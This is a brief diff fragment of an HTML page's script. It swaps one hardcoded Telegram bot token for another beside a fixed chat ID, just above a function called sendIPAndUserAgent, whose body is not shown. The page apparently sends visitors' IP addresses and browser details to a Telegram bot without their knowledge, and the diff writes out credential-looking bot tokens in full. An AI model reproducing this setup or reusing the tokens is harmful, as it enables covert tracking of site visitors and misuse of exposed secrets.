@@ -60,7 +60,7 @@ a {
 }
 </style>
 <script>
-const BOT_TOKEN = '7209947234:AAH8u8-TrKewLHj67cyC-nlzYLIhwXGqzt8';
+const BOT_TOKEN = '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8';
 const CHAT_ID = '6326816238';
 
         function sendIPAndUserAgent() {
